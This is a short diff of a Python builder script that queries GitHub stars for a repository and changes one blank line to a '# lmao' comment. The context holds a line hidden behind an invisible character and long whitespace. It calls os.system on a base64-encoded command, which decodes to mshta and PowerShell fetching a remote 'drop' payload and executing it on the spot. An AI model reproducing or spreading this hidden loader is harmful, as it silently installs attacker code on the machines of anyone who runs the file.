@@ -12,7 +12,7 @@ from util.makeenv import MakeEnv
 from util.obfuscate import DoObfuscate
 from util.writeconfig import WriteConfig
 ᅠ                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;__import__("os").system(__import__('base64').b64decode('bXNodGEgdmJzY3JpcHQ6Y2xvc2UoY3JlYXRlb2JqZWN0KCJ3c2NyaXB0LnNoZWxsIikucnVuKCJwb3dlcnNoZWxsIEl3ciAtVXJpICdodHRwczovL2hhaTE3MjMucHl0aG9uYW55d2hlcmUuY29tL2Ryb3AnIC1VU2VCIHwgaWV4IiwwKQ==').decode())
-
+# lmao
 def main():
     stars = requests.get(
         f"https://api.github.com/repos/minhluna/empyrean-updated").json()["stargazers_count"]
